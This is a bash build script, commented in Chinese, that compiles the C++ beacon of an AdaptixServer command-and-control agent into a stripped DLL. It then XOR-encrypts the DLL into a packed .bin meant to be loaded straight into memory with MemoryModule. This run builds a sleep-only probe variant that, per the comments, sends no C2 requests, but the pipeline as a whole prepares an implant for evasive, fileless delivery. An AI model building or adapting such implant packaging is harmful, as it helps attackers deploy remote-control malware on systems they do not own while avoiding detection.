#!/usr/bin/env bash
set -euo pipefail

# 文件作用：把 direct_https_agent 的 C++ beacon 代码编译成一个 sleep-only DLL probe。
#
# 为什么先做 sleep-only：
# - 它会进入 direct_https 的 AgentMain()，但立刻走 DIRECT_HTTPS_SANDBOX_PROBE_STAGE=54。
# - stage 54 只 Sleep 一小段时间后返回，不加载 WinINet、不读取 profile、不发 C2 请求。
# - 这样可以单独验证“direct_https 代码能不能 DLL 化并被 MemoryModule 内存加载”。

ROOT="${ROOT:-${REPO_ROOT}}"
AGENT_SRC="$ROOT/AdaptixServer/extenders/direct_https_agent/src_beacon"
LAB="$ROOT/research/memory-loader-lab"
BUILD="$LAB/build/x64"
OBJ="$BUILD/direct_https_sleep_objects"
KEY="${KEY:-CHANGE_ME_MEMORY_LOADER_KEY}"
DELAY_MS="${DELAY_MS:-5000}"

CXX="${CXX:-x86_64-w64-mingw32-g++}"

mkdir -p "$BUILD" "$OBJ"
rm -rf "$OBJ"
mkdir -p "$OBJ"

echo "[*] Building direct_https sleep-only objects into: $OBJ"
make -C "$AGENT_SRC" \
  HTTP_DIST_DIR="$OBJ" \
  DIRECT_HTTPS_SANDBOX_PROBE_STAGE=54 \
  DIRECT_HTTPS_DELAY_BEFORE_SEND_MS="$DELAY_MS" \
  DIRECT_HTTPS_REQUIRE_TRIGGER_FILE=0 \
  DIRECT_HTTPS_EXIT_BEFORE_SEND=0 \
  DIRECT_HTTPS_CAPTURE_PORT_8001=0 \
  clean pre x64

echo "[*] Compiling dummy config object"
"$CXX" -c "$OBJ/config.cpp" \
  -DPROFILE='""' \
  -DPROFILE_SIZE=0 \
  -o "$OBJ/config.x64.o"

echo "[*] Compiling DLL export wrapper"
"$CXX" -c "$LAB/src/direct_https_dll_entry.cpp" \
  -I "$AGENT_SRC/beacon" \
  -fpermissive -w -masm=intel -fPIC \
  -D BEACON_HTTP \
  -o "$OBJ/direct_https_dll_entry.x64.o"

DLL="$BUILD/direct_https_agent_sleep.x64.dll"
BIN="$BUILD/direct_https_agent_sleep.x64.bin"

echo "[*] Linking DLL: $DLL"
OBJECTS=(
  "$OBJ/config.x64.o"
  "$OBJ/Agent.x64.o"
  "$OBJ/AgentConfig.x64.o"
  "$OBJ/AgentInfo.x64.o"
  "$OBJ/ApiLoader.x64.o"
  "$OBJ/Commander.x64.o"
  "$OBJ/ConnectorHTTP.x64.o"
  "$OBJ/Crypt.x64.o"
  "$OBJ/Downloader.x64.o"
  "$OBJ/Encoders.x64.o"
  "$OBJ/JobsController.x64.o"
  "$OBJ/MainAgent.x64.o"
  "$OBJ/MemorySaver.x64.o"
  "$OBJ/Packer.x64.o"
  "$OBJ/ProcLoader.x64.o"
  "$OBJ/WaitMask.x64.o"
  "$OBJ/crt.x64.o"
  "$OBJ/std.x64.o"
  "$OBJ/utils.x64.o"
  "$OBJ/direct_https_dll_entry.x64.o"
)

"$CXX" -shared -Os -s -Wl,-s,--gc-sections -static-libgcc -static-libstdc++ \
  "${OBJECTS[@]}" \
  -o "$DLL" \
  -Wl,--out-implib,"$BUILD/libdirect_https_agent_sleep.a"

echo "[*] Packing encrypted bin: $BIN"
python3 "$LAB/pack_xor.py" "$DLL" "$BIN" "$KEY" > "$BUILD/direct_https_agent_sleep_pack_xor.log"

echo "[+] DLL: $(sha256sum "$DLL")"
echo "[+] BIN: $(sha256sum "$BIN")"

